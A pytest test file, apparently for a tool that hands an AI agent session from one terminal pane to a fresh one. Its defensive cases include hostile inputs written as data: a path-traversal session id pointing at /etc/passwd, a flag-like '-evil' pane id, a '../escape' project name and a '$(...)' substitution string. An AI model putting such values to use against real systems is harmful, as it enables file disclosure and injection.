        """The exact pass-6 scenario: inventory fails, then the split returns a well-formed
        pre-existing FOREIGN id. Nothing may be closed."""
        def runner(argv, timeout=180):
            if argv[:3] == ["herdr", "pane", "list"]:
                return FakeProc(0, "malformed")
            if argv[:3] == ["herdr", "pane", "split"]:
                return FakeProc(0, json.dumps({"result": {"pane_id": "w1:pFOREIGN"}}))
            return FakeProc(1)

        out = ll.perform_handoff(runner=runner, **_handoff())
        assert out["ok"] is False and out["failed_step"] == "pane_inventory_unavailable"
        assert out["new_pane"] is None

    def test_a_split_TIMEOUT_after_creation_still_reports(self) -> None:
        """#611 Step-11 pass-4 Medium 4: the split used to run OUTSIDE the ownership
        try/finally, so a client timeout after herdr had already created the pane skipped
        cleanup entirely."""
        listings = [json.dumps({"result": {"panes": [{"pane_id": "w1:p1"}]}}),
                    json.dumps({"result": {"panes": [{"pane_id": p}
                                                     for p in ("w1:p1", "w1:pNEW")]}})]

        def runner(argv, timeout=180):
            if argv[:3] == ["herdr", "pane", "list"]:
                return FakeProc(0, listings.pop(0) if listings else listings[-1:] and "")
            if argv[:3] == ["herdr", "pane", "split"]:
                raise subprocess.TimeoutExpired(cmd="herdr", timeout=180)
            return FakeProc(0)

        out = ll.perform_handoff(runner=runner, **_handoff())
        assert out["ok"] is False
        assert out["cleanup"] and "POSSIBLE ORPHAN" in out["cleanup"]

    @pytest.mark.parametrize("returned", ["w1:p1", "w1:pEXISTING"])
    def test_a_returned_id_that_is_not_new_is_never_closed(self, returned) -> None:
        """#611 Step-11 pass-5 High 1: a well-formed response is not proof of ownership. If
        herdr returned the anchor, or an id that already existed, closing it would kill a live
        pane — possibly the predecessor itself, the exact outcome report-only exists to avoid."""
        r = self._runner(json.dumps({"result": {"pane_id": returned}}),
                         before=("w1:p1", "w1:pEXISTING"),
                         after=("w1:p1", "w1:pEXISTING"))
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is False and out["failed_step"] == "split_response_not_new"
        assert out["new_pane"] is None, "an unprovable id must not be claimed as ours"
        assert not any(c[:3] == ["herdr", "pane", "close"] for c in r.calls)

    def test_an_invalid_returned_pane_id_still_reports(self) -> None:
        """A pane id that parses but fails validation left `new_pane` unset, so the `finally`
        saw nothing to clean up (pass-4 Medium 4, second half)."""
        r = self._runner(json.dumps({"result": {"pane_id": "-evil"}}))
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is False
        assert out["cleanup"] and "POSSIBLE ORPHAN" in out["cleanup"]
        assert not any(c[:3] == ["herdr", "pane", "close"] for c in r.calls)


class TestTranscriptPathIsBuiltNotSupplied:
    """#611 Step-11 pass-7 Medium 2. The earlier revision took a `transcript_path_for` CALLBACK
    and probed it with an invented session id — which rejected any callback that validated its
    input, and proved nothing about the real id anyway. Taking the directory and building the
    path internally removes the callback, the sentinel, and the gap between them."""

    def test_a_missing_transcript_dir_is_refused_before_anything_runs(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK})
        with pytest.raises(ll.LauncherError):
            ll.perform_handoff(runner=r, **_handoff(transcript_dir="/no/such/dir"))
        assert r.calls == []

    @pytest.mark.parametrize("bad", ["", None, 7])
    def test_a_non_directory_transcript_dir_is_refused(self, bad) -> None:
        r = Runner({"herdr pane split": SPLIT_OK})
        with pytest.raises(ll.LauncherError):
            ll.perform_handoff(runner=r, **_handoff(transcript_dir=bad))
        assert r.calls == []

    def test_a_traversing_session_id_cannot_escape_the_directory(self) -> None:
        """herdr supplies the session id and it is interpolated into a path, so an id carrying
        `..` or a separator would read a file outside the transcript directory."""
        evil = json.dumps({"result": {"pane": {
            "agent_session": {"value": "../../../../etc/passwd"}}}})
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": evil})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is False and out["failed_step"] == "session_id_malformed"
        assert not _predecessor_closed(r)
        assert out["cleanup"] and "closed tentative pane" in out["cleanup"]

    def test_the_real_session_id_shape_is_accepted(self) -> None:
        assert ll._SESSION_ID_RE.fullmatch("75f231f2-fdf2-40d4-a68d-71bafcfc8608")


class TestBoundedPolling:
    """The second revision read each artifact ONCE, immediately after `send-keys`, giving the
    hooks no time to write. That is a race whose losing side retires nothing and stalls the run."""

    def test_an_artifact_that_appears_late_is_still_found(self) -> None:
        slept: list[float] = []
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(
            read_text=Artifacts(appear_after=3), sleeper=slept.append))
        assert out["ok"] is True, out
        assert slept, "polling must actually wait between reads"

    def test_polling_is_bounded_and_fails_closed(self) -> None:
        slept: list[float] = []
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(
            read_text=Artifacts(transcript=""), sleeper=slept.append))
        assert out["ok"] is False and out["failed_step"] == "goal_armed"
        assert len(slept) <= ll.GOAL_POLL_ATTEMPTS, "polling must be bounded"
        assert not _predecessor_closed(r)

    def test_a_partial_multibyte_read_is_retried_not_fatal(self) -> None:
        """`UnicodeDecodeError` is a ValueError, so catching OSError alone let a read that
        landed mid-character escape the poll and kill the handoff (pass-3 Low 5)."""
        state = {"n": 0}
        arts = Artifacts()

        def flaky(path):
            state["n"] += 1
            if state["n"] == 3:
                raise UnicodeDecodeError("utf-8", b"\xf0\x9f", 0, 2, "truncated")
            return arts(path)

        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(read_text=flaky, sleeper=lambda _s: None))
        assert out["ok"] is True, out

    def test_a_read_error_mid_poll_does_not_abort_the_poll(self) -> None:
        state = {"n": 0}
        arts = Artifacts()

        def flaky(path):
            state["n"] += 1
            if state["n"] == 3:
                raise OSError("transient")
            return arts(path)

        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(read_text=flaky, sleeper=lambda _s: None))
        assert out["ok"] is True, out


class TestPollingIsBoundedOnWallClockToo:
    """#694 cross-model review, still open when the falsified fix was reverted.

    An attempts cap bounds how many times `check` runs, not how long the poll may take: each
    attempt does I/O and a blocked read has no ceiling of its own. The review's arithmetic was a
    20-attempt poll whose every call could take the runner's 180 s timeout — about an hour of
    wall clock behind a budget that reads as short.
    """

    def test_a_slow_poll_stops_at_the_wall_clock_deadline(self) -> None:
        clock = {"t": 0.0}
        seen = {"n": 0}

        def check():
            seen["n"] += 1
            clock["t"] += 60.0          # every read blocks for a minute
            return False

        assert ll._poll_for(check, attempts=ll.SWITCH_POLL_ATTEMPTS,
                            delay_s=ll.SWITCH_POLL_DELAY_S, sleeper=lambda _s: None,
                            now=lambda: clock["t"]) is False
        assert seen["n"] < ll.SWITCH_POLL_ATTEMPTS, \
            "the poll spent its whole attempt budget — the wall clock never bounded it"
        nominal = ll.SWITCH_POLL_ATTEMPTS * ll.SWITCH_POLL_DELAY_S
        assert clock["t"] <= nominal * ll.POLL_WALL_CLOCK_SLACK + 60.0

    def test_the_first_attempt_always_runs_even_past_the_deadline(self) -> None:
        """A deadline that could refuse before checking once would turn a slow clock into a
        verdict — the artifact may already be on disk."""
        seen = {"n": 0}

        def check():
            seen["n"] += 1
            return True

        assert ll._poll_for(check, attempts=5, delay_s=1.0, sleeper=lambda _s: None,
                            max_wall_s=0.0, now=lambda: 10.0) is True
        assert seen["n"] == 1

    def test_a_poll_that_simply_needs_several_attempts_is_unaffected(self) -> None:
        """The bound must not refuse a healthy artifact that appears late — that is the whole
        reason bounded polling exists (see TestBoundedPolling)."""
        state = {"n": 0}

        def check():
            state["n"] += 1
            return state["n"] == 5

        assert ll._poll_for(check, attempts=ll.GOAL_POLL_ATTEMPTS, delay_s=ll.GOAL_POLL_DELAY_S,
                            sleeper=lambda _s: None, now=lambda: 0.0) is True

    def test_the_pane_ready_retry_is_bounded_on_wall_clock(self) -> None:
        """`agent_start` is where the arithmetic actually bit: 15 attempts against a runner whose
        timeout is 180 s is a 45-minute ceiling on 'a condition that resolves itself in about a
        second'."""
        clock = {"t": 0.0}
        starts = {"n": 0}

        def runner(argv, timeout=180):
            if argv[:3] == ["herdr", "pane", "list"]:
                return FakeProc(0, PANE_LIST_ANCHOR_ONLY)
            if argv[:3] == ["herdr", "pane", "split"]:
                return FakeProc(0, SPLIT_OK)
            if argv[:3] == ["herdr", "agent", "start"]:
                starts["n"] += 1
                clock["t"] += 180.0     # every attempt burns the runner's whole timeout
                return FakeProc(1, '{"error":{"code":"agent_pane_busy"}}')
            return FakeProc(0, PANE_GET_OK)

        out = ll.perform_handoff(runner=runner, **_handoff(now=lambda: clock["t"]))
        assert out["failed_step"] == "agent_start"
        assert starts["n"] < ll.PANE_READY_ATTEMPTS, \
            "the retry ran its whole attempt budget — the wall clock never bounded it"


# ---------------------------------------------------------------------------
# AC6 — the condition is read VERBATIM from the predecessor's own transcript
# ---------------------------------------------------------------------------

class TestVerbatimConditionExtraction:
    def test_the_last_unmet_condition_is_returned_verbatim(self) -> None:
        assert ll.last_unmet_goal_condition(TRANSCRIPT_OK) == GOAL_CONDITION

    def test_the_LAST_unmet_row_wins_not_the_first(self) -> None:
        rows = "\n".join(json.dumps(
            {"attachment": {"type": "goal_status", "met": False, "condition": c}})
            for c in ("first goal", "second goal"))
        assert ll.last_unmet_goal_condition(rows) == "second goal"

    def test_a_met_goal_is_not_a_condition_to_re_arm(self) -> None:
        met = json.dumps({"attachment": {"type": "goal_status", "met": True,
                                         "condition": "already done"}})
        assert ll.last_unmet_goal_condition(met) is None

    def test_absent_or_unparseable_yields_none_never_a_guess(self) -> None:
        for text in ("", "garbage\n", '{"goal_status":{"met":false}}'):
            assert ll.last_unmet_goal_condition(text) is None

    def test_a_multiline_condition_survives_verbatim(self) -> None:
        cond = "line one\nline two\n  - a bullet with `backticks` and $(not expanded)"
        row = json.dumps({"attachment": {"type": "goal_status", "met": False,
                                         "condition": cond}})
        assert ll.last_unmet_goal_condition(row) == cond


# ---------------------------------------------------------------------------
# A freshly split pane is not immediately an available shell — found LIVE, 2026-07-28
# ---------------------------------------------------------------------------

# The verbatim refusal herdr 0.7.5 returns when `agent start` targets a pane whose shell has
# not come up yet. Captured from a real run against the live server during epic #667: the
# handoff split successfully, `agent start` failed instantly, and the ownership discipline
# correctly closed the tentative pane — so the whole handoff aborted on a condition that
# resolves itself in a second or two.
AGENT_PANE_BUSY = json.dumps({
    "error": {"code": "agent_pane_busy",
              "message": "agent target pane w1:pBC is not an available shell"},
    "id": "cli:agent:start"})


class BusyThenReadyRunner(Runner):
    """`herdr agent start` refuses with agent_pane_busy for the first N calls, then succeeds."""

    def __init__(self, busy_times, **kw):
        super().__init__(**kw)
        self.busy_times = busy_times
        self.start_calls = 0

    def __call__(self, argv, timeout=180):
        if self.key(argv) == "herdr agent start":
            self.calls.append(list(argv))
            self.start_calls += 1
            if self.start_calls <= self.busy_times:
                return FakeProc(returncode=1, stdout=AGENT_PANE_BUSY)
            return FakeProc(returncode=0, stdout="")
        return super().__call__(argv, timeout=timeout)


class TestSplitPaneReadiness:
    def test_agent_start_is_retried_while_the_pane_is_busy(self) -> None:
        """The pane becomes available on its own; the handoff must wait for it rather than
        abort. Before this fix a real handoff died here with the split already done."""
        r = BusyThenReadyRunner(2, responses={"herdr pane split": SPLIT_OK,
                                              "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is True, out
        assert r.start_calls == 3, "expected two refusals then a success"

    def test_a_pane_that_never_becomes_available_still_fails_closed(self) -> None:
        """Bounded, not infinite: a genuinely broken pane must still abort — and must still
        close the tentative pane, because ownership never transferred."""
        r = BusyThenReadyRunner(10_000, responses={"herdr pane split": SPLIT_OK,
                                                   "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is False
        assert out["failed_step"] == "agent_start"
        assert r.start_calls == ll.PANE_READY_ATTEMPTS
        assert out["cleanup"] == "closed tentative pane w1:pZZ"

    def test_a_non_busy_failure_is_not_retried(self) -> None:
        """Only the self-resolving condition is waited on. A different refusal — a bad name, a
        dead server — is terminal, and retrying it would just delay the abort."""
        r = Runner(responses={"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK},
                   fail_on="herdr agent start")
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is False and out["failed_step"] == "agent_start"
        assert r.kinds().count("herdr agent start") == 1

    def test_the_refusal_body_is_recorded_on_the_step(self) -> None:
        """The live failure cost a manual reproduction to diagnose because the sequence
        discarded herdr's own error payload. Keep it on the step record."""
        r = BusyThenReadyRunner(10_000, responses={"herdr pane split": SPLIT_OK,
                                                   "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff())
        starts = [s for s in out["steps"] if s["kind"] == "agent_start"]
        assert starts, "no agent_start step recorded"
        assert any("agent_pane_busy" in (s.get("note") or "") for s in starts), \
            "herdr's error code must survive onto the step record"


# ---------------------------------------------------------------------------
# #694 — three sends, each gated on a DURABLE ARTIFACT, and `/goal` LAST
#
# The predecessor of this class gated the resume-prompt paste on `agent_status == "idle"`. It was
# falsified by live measurement before it shipped, and these tests exist so it cannot come back:
#
#   - X1: after a REAL unmet goal was armed, the pane reported `working` on consecutive reads while
#     the `goal_status met:false` row was ALREADY present. An idle gate placed after `goal_armed`
#     therefore refuses EVERY real handoff — strictly worse than the bug it was meant to fix.
#   - X2: `/goal` pasted into a session actively mid-turn produced its row while that turn was
#     still running. It needs no idle window, which is what lets it go LAST.
#   - `agent_status` is not a synchronisation signal at all: `idle` right after a prompt was
#     submitted, `done` mid-output, `working` at an empty input line.
#
# So the gates are artifacts the successor itself writes, and nothing branches on pane status.
# ---------------------------------------------------------------------------

class TestAgentStatusNeverGatesControlFlow:
    """The falsified gate, pinned shut from the other side."""

    @pytest.mark.parametrize("status", ["working", "blocked", "done", "unknown", None])
    def test_a_handoff_completes_whatever_the_pane_status_says(self, status) -> None:
        """X1 is the case that matters: a healthy successor mid-goal-turn reads `working`. Any
        branch on this value refuses a handoff that is actually fine."""
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": _pane_get(status)})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is True, out
        assert out["failed_step"] is None
        assert RESUME_PROMPT in _sent(r), "the resume prompt was withheld on a pane-status reading"

    def test_no_pane_get_happens_between_the_sends(self) -> None:
        """The falsified design read `pane get` between two sends to sample readiness. The only
        legitimate `pane get` is the early one that reads the session id, before any send."""
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is True, out
        kinds = [s["kind"] for s in out["steps"]]
        first_send = min(i for i, k in enumerate(kinds) if k.startswith("send_"))
        assert "pane_get" not in kinds[first_send:], \
            "a readiness sample crept back in between the sends"


class TestTheThreeSendsAreOrderedAndGated:
    @staticmethod
    def _send_texts(out) -> list[str]:
        """The `kind` of each send-text step, in order."""
        return [s["kind"] for s in out["steps"] if s["kind"] in
                ("send_bind", "send_resume_prompt", "send_text")]

    def test_the_bind_goes_first_the_goal_second_and_the_prompt_last(self) -> None:
        """#989: the two BARE SLASH COMMANDS take the idle windows, the PROSE prompt takes the
        busy one. A slash command pasted into a busy pane is queued, never executed (#718)."""
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is True, out
        assert self._send_texts(out) == ["send_bind", "send_text", "send_resume_prompt"]

    def test_the_bind_is_its_own_send_carrying_the_project(self) -> None:
        """A bare `/rawgentic:switch` enters the switch skill's LIST MODE and waits for a human
        (#682), so the argument is the whole point of sending it at all."""
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is True, out
        assert _sent(r)[0] == f"/rawgentic:switch {PROJECT}"

    def test_the_prompt_is_not_sent_until_the_REGISTRY_ROW_appears(self) -> None:
        """The gate is the durable artifact, not a timer and not pane status. Without the row the
        prompt must never go out and the predecessor must survive."""
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(read_text=Artifacts(registry="")))
        assert out["ok"] is False and out["failed_step"] == "project_switched", out
        assert RESUME_PROMPT not in _sent(r), \
            "the resume prompt was sent to a successor that never bound"
        assert not _predecessor_closed(r)

    def test_the_prompt_is_not_sent_until_the_GOAL_has_armed(self) -> None:
        """`goal_armed` reads the row out of the successor's own transcript — rc 0 on send-text
        proves transport, not arrival, and #989 proved that distinction in production: four
        handoffs returned rc 0 on the goal send and produced no row at all.

        Inverted from `test_the_goal_is_not_sent_until_the_PROMPT_has_landed`. The dependency now
        runs the other way, which is what removes the unguarded window entirely.
        """
        marker = "[rawgentic-midchild:4:7]"
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(
            resume_prompt=f"{marker} {RESUME_PROMPT}", prompt_marker=marker,
            read_text=Artifacts(transcript="")))
        assert out["ok"] is False and out["failed_step"] == "goal_armed", out
        assert RESUME_PROMPT not in " ".join(_sent(r)), \
            "work was handed to a successor whose guard never armed"
        assert not _predecessor_closed(r)

    def test_a_prompt_that_carries_its_own_bind_is_refused_before_anything_runs(self) -> None:
        """The exact inverse of #682's precondition, and deliberately so: the bind is SEND 1 now,
        so a prompt that also binds would make the successor run the switch skill twice. A caller
        still passing the old shape is a caller that has not been updated."""
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        with pytest.raises(ll.LauncherError, match="carries"):
            ll.perform_handoff(runner=r, **_handoff(resume_prompt=RESUME_PROMPT_WITH_BIND))
        assert r.calls == [], "a caller mismatch must be refused before a pane exists"

    @pytest.mark.parametrize("bad", [None, "", "not a project name!", "../escape"])
    def test_an_unusable_expected_project_is_refused_before_anything_runs(self, bad) -> None:
        """SEND 1 is built from it, so it is required rather than optional."""
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        with pytest.raises(ll.LauncherError, match="valid project name"):
            ll.perform_handoff(runner=r, **_handoff(expected_project=bad))
        assert r.calls == []


class TestTheLadderMatchesTheSendOrder:
    def test_the_launch_ladder_follows_the_sends(self) -> None:
        """#694 REORDERED this. `evaluate_verifications` stops at the first failure, so a ladder
        listing rungs out of send order reports the wrong step as the thing that broke."""
        assert [s["step"] for s in ll.handoff_verification_steps()] == [
            "spawned", "project_switched", "goal_armed"]

    def test_the_mid_child_ladder_follows_the_sends(self) -> None:
        """#840 prepends `queue_revalidated`: the queue must be revalidated BEFORE a successor is
        spawned to inherit it, so it cannot sit among the post-launch rungs."""
        assert [s["step"] for s in ll.mid_child_verification_steps()] == [
            "queue_revalidated", "spawned", "project_switched", "goal_armed", "prompt_landed",
            "position_rebuilt", "state_claimed"]

    def test_the_old_goal_first_ladder_is_no_longer_permitted(self) -> None:
        """A reordered ladder is refused outright, so the pre-#694 order cannot be smuggled back
        in by a caller passing `steps=`."""
        with pytest.raises(ll.LauncherError, match="non-canonical"):
            ll.evaluate_verifications(
                {"spawned": True, "goal_armed": True, "project_switched": True},
                steps=[{"step": "spawned"}, {"step": "goal_armed"},
                       {"step": "project_switched"}])



class TestParsePaneAgentStatus:
    def test_reads_a_REAL_herdr_response(self) -> None:
        assert ll.parse_pane_agent_status(PANE_GET_REAL) == "idle"
        # the same real bytes must still yield the session id the existing check relies on
        assert ll.parse_pane_agent_session(PANE_GET_REAL)

    @pytest.mark.parametrize("status", ["idle", "working", "blocked", "done", "unknown"])
    def test_round_trips_every_status_herdr_documents(self, status) -> None:
        assert ll.parse_pane_agent_status(_pane_get(status)) == status

    @pytest.mark.parametrize("bad", ["", "not json", "[]", "null", '{"result": {}}',
                                     '{"result": {"pane": {}}}',
                                     '{"result": {"pane": {"agent_status": ""}}}',
                                     '{"result": {"pane": {"agent_status": 3}}}'])
    def test_unreadable_input_is_None_never_a_guess(self, bad) -> None:
        assert ll.parse_pane_agent_status(bad) is None


class TestInsertPrompt:
    """#718 — the meter INSERTS A PROSE PROMPT at the act tier.

    Two facts were measured live on 2026-07-29 and both are pinned here, because both are the
    kind a later refactor would quietly undo:

    * A BARE SLASH COMMAND is inert. Inserted into a session with an unmet `/goal`, `/tasklist`
      sat queued through five goal-driven turns and was consumed only after the goal was
      achieved. Prose inserted the same way was acted on in 17 seconds.
    * An `Enter` sent immediately after the paste returns rc 0 and submits NOTHING. The text sat
      in the input box past goal completion until a later Enter arrived. A 1.5 s delay between
      the paste and the Enter does submit.
    """

    PROSE = ("Context is at 52% of the window. Please run the rawgentic pane-handoff skill now "
             "to pass this work to a fresh pane.")

    # ---- AC3: prose, never a bare slash command -------------------------------------------
    @pytest.mark.parametrize("prose", [
        PROSE,
        "okay, please run /rawgentic:pane-handoff",          # prose CONTAINING a command is fine
        "please run the pane-handoff skill now",
    ])
    def test_prose_is_accepted(self, prose) -> None:
        ll.validate_inserted_prompt(prose)                   # must not raise

    @pytest.mark.parametrize("bare", [
        "/rawgentic:pane-handoff",
        "/tasklist",
        "  /rawgentic:pane-handoff  ",                       # leading whitespace is still bare
        "/pane-handoff now please",                           # args do not make it prose
    ])
    def test_bare_slash_command_is_refused(self, bare) -> None:
        """AC3. A bare slash command is not a slower prompt — it is an inert one."""
        with pytest.raises(ll.LauncherError) as excinfo:
            ll.validate_inserted_prompt(bare)
        assert "slash command" in str(excinfo.value).lower()

    @pytest.mark.parametrize("empty", ["", "   ", "\n\t "])
    def test_empty_is_refused(self, empty) -> None:
        with pytest.raises(ll.LauncherError):
            ll.validate_inserted_prompt(empty)

    # ---- the delivery sequence ------------------------------------------------------------
    def test_paste_then_delay_then_enter_in_that_order(self) -> None:
        slept: list[float] = []
        runner = Runner()
        ok, reason = ll.insert_prompt(pane="w1:pZZ", text=self.PROSE, runner=runner,
                                      sleep=slept.append)
        assert ok, reason
        # TWO reads: one before typing, one after the delay and immediately before the Enter. The
        # second exists because the delay is a window in which a permission dialog can appear.
        assert runner.kinds() == ["herdr pane read", "herdr pane send-text",
                                  "herdr pane read", "herdr pane send-keys"]
        assert slept == [ll.INSERT_SUBMIT_DELAY_S]

    def test_a_dialog_appearing_DURING_the_delay_stops_the_enter(self) -> None:
        """The 1.5 s delay is a real window. An Enter fired into a dialog that opened inside it
        accepts the dialog instead of submitting a turn (#718 Step-11 diff review, High)."""
        reads: list[str] = []

        def runner(argv, timeout=180):
            kind = " ".join(argv[:3])
            if kind == "herdr pane read":
                reads.append(kind)
                clean = len(reads) == 1        # first read clean, second shows a dialog
                return FakeProc(0, "" if clean else "Do you want to proceed?")
            return FakeProc(0, "")

        ok, reason = ll.insert_prompt(pane="w1:pZZ", text=self.PROSE, runner=runner,
                                      sleep=lambda _s: None)
        assert ok is False
        assert "refusing to submit" in reason
        assert "UNSUBMITTED" in reason, "the caller must know the prose is sitting there"

    def test_the_delay_is_between_the_paste_and_the_enter(self) -> None:
        """Ordering is the whole fix: a delay BEFORE the paste would not help (#718 spike)."""
        order: list[str] = []
        runner = Runner()
        original = runner.__call__

        def recording(argv, timeout=180):
            order.append(" ".join(argv[:3]))
            return original(argv, timeout=timeout)

        ll.insert_prompt(pane="w1:pZZ", text=self.PROSE, runner=recording,
                         sleep=lambda _s: order.append("SLEPT"))
        assert order.index("SLEPT") > order.index("herdr pane send-text")
        assert order.index("SLEPT") < order.index("herdr pane send-keys")

    def test_a_bare_slash_never_reaches_the_terminal(self) -> None:
        runner = Runner()
        with pytest.raises(ll.LauncherError):
            ll.insert_prompt(pane="w1:pZZ", text="/rawgentic:pane-handoff", runner=runner,
                             sleep=lambda _s: None)
        assert runner.calls == [], "a refused prompt must not touch the pane at all"

    # ---- safety: an Enter accepts whatever is on screen -----------------------------------
    def test_refuses_when_a_permission_dialog_is_showing(self) -> None:
        """An Enter would ACCEPT the dialog rather than submit our text."""
        runner = Runner(responses={
            "herdr pane read": "Do you want to allow this? \n No, and tell Claude what to do"})
        ok, reason = ll.insert_prompt(pane="w1:pZZ", text=self.PROSE, runner=runner,
                                      sleep=lambda _s: None)
        assert ok is False
        assert "permission" in reason.lower()
        assert runner.kinds() == ["herdr pane read"], "nothing may be typed after the veto"

    def test_unreadable_pane_refuses_rather_than_typing_blind(self) -> None:
        runner = Runner(fail_on="herdr pane read")
        ok, reason = ll.insert_prompt(pane="w1:pZZ", text=self.PROSE, runner=runner,
                                      sleep=lambda _s: None)
        assert ok is False
        assert "read" in reason.lower()

    @pytest.mark.parametrize("failing", ["herdr pane send-text", "herdr pane send-keys"])
    def test_a_failed_herdr_call_is_reported_not_swallowed(self, failing) -> None:
        runner = Runner(fail_on=failing)
        ok, reason = ll.insert_prompt(pane="w1:pZZ", text=self.PROSE, runner=runner,
                                      sleep=lambda _s: None)
        assert ok is False and reason

    def test_rc_zero_is_reported_as_delivery_not_proven_submission(self) -> None:
        """#718 spike: rc 0 on send-keys is transport, not submission. Say so in the reason."""
        ok, reason = ll.insert_prompt(pane="w1:pZZ", text=self.PROSE, runner=Runner(),
                                      sleep=lambda _s: None)
        assert ok is True
        assert "submission" in reason.lower()

    def test_pane_id_is_validated(self) -> None:
        with pytest.raises(ll.LauncherError):
            ll.insert_prompt(pane="not a pane", text=self.PROSE, runner=Runner(),
                             sleep=lambda _s: None)

    # ---- the CLI -------------------------------------------------------------------------
    def test_cli_refuses_a_bare_slash_command(self) -> None:
        proc = _cli("insert-prompt", "--pane", "w1:pZZ", "--text", "/rawgentic:pane-handoff")
        assert proc.returncode != 0
        assert "slash command" in (proc.stderr + proc.stdout).lower()

    def test_cli_rejects_an_invalid_pane(self) -> None:
        proc = _cli("insert-prompt", "--pane", "not a pane", "--text", "please hand off")
        assert proc.returncode != 0


# --------------------------------------------------------- #927 transport probe

class _ProbeProc:
    """Minimal stand-in for a completed subprocess."""

    def __init__(self, returncode=0, stdout="", stderr=""):
        self.returncode = returncode
        self.stdout = stdout
        self.stderr = stderr


def _probe_pane_list(*pane_ids, agents=None):
    """A `herdr pane list` response. `agents` names which panes have an agent."""
    agents = {p: True for p in pane_ids} if agents is None else agents
    return json.dumps({"result": {"panes": [
        {"pane_id": p, "workspace_id": p.split(":")[0],
         "agent": ("claude" if agents.get(p) else None),
         "agent_status": ("working" if agents.get(p) else None)}
        for p in pane_ids]}})


def _probe_pane_get(pane_id, workspace_id=None):
    ws = workspace_id if workspace_id is not None else pane_id.split(":")[0]
    return json.dumps({"result": {"pane": {"pane_id": pane_id, "workspace_id": ws}}})


class TestTransportProbe:
    """#927: the two tiers are reported SEPARATELY, and nothing is asserted without a round trip.

    The collapse of these two into one verdict was a self-review finding on the design: campaign
    creation legitimately has no pane reference, so a single verdict would report `inline` there
    and silently re-break the default this issue exists to invert.
    """

    def test_healthy_herdr_and_a_live_pane_gives_both_tiers(self) -> None:
        def runner(argv, timeout=None):
            if argv[:3] == ["herdr", "pane", "list"]:
                return _ProbeProc(0, _probe_pane_list("w1:aaa", "w1:bbb"))
            if argv[:3] == ["herdr", "pane", "get"]:
                return _ProbeProc(0, _probe_pane_get("w1:aaa"))
            raise AssertionError(f"unexpected argv {argv}")

        cap, pane, reason = ll.transport_probe(pane_ref="w1:aaa", runner=runner)
        assert (cap, pane) == (True, True)
        assert reason == "probe_ok"

    def test_no_pane_reference_still_proves_CAPABILITY(self) -> None:
        """The creation path: no pane ref exists, but herdr is healthy.

        `capability_ok` must be True so creation can record `pane_chain`. Returning a single
        collapsed `inline` verdict here is exactly the AC-1 regression.
        """
        calls = []

        def runner(argv, timeout=None):
            calls.append(argv)
            return _ProbeProc(0, _probe_pane_list("w1:aaa"))

        cap, pane, reason = ll.transport_probe(pane_ref=None, runner=runner)
        assert cap is True
        assert pane is False
        assert reason == "no_pane_ref"
        assert all(a[:3] != ["herdr", "pane", "get"] for a in calls), (
            "tier 2 must not run without a pane reference")

    def test_unreachable_herdr_fails_both_tiers(self) -> None:
        cap, pane, reason = ll.transport_probe(
            pane_ref="w1:aaa", runner=lambda argv, timeout=None: _ProbeProc(1, ""))
        assert (cap, pane) == (False, False)
        assert reason == "herdr_unreachable"

    def test_a_missing_binary_is_not_a_crash(self) -> None:
        def runner(argv, timeout=None):
            raise FileNotFoundError("herdr")

        cap, pane, reason = ll.transport_probe(pane_ref="w1:aaa", runner=runner)
        assert (cap, pane) == (False, False)
        assert reason == "herdr_absent"

    def test_a_timeout_degrades_rather_than_raising(self) -> None:
        def runner(argv, timeout=None):
            raise subprocess.TimeoutExpired(cmd=argv, timeout=5)

        cap, pane, reason = ll.transport_probe(pane_ref="w1:aaa", runner=runner)
        assert (cap, pane) == (False, False)
        assert reason == "probe_timeout"

    def test_an_identity_mismatch_is_refused(self) -> None:
        """An rc 0 response ABOUT A DIFFERENT PANE is not evidence about this one."""
        def runner(argv, timeout=None):
            if argv[:3] == ["herdr", "pane", "list"]:
                return _ProbeProc(0, _probe_pane_list("w1:aaa"))
            return _ProbeProc(0, _probe_pane_get("w1:zzz"))

        cap, pane, reason = ll.transport_probe(pane_ref="w1:aaa", runner=runner)
        assert cap is True
        assert pane is False
        assert reason == "probe_identity_mismatch"

    def test_a_workspace_mismatch_is_refused(self) -> None:
        def runner(argv, timeout=None):
            if argv[:3] == ["herdr", "pane", "list"]:
                return _ProbeProc(0, _probe_pane_list("w1:aaa"))
            return _ProbeProc(0, _probe_pane_get("w1:aaa", workspace_id="w9"))

        cap, pane, reason = ll.transport_probe(pane_ref="w1:aaa", runner=runner)
        assert (cap, pane) == (True, False)
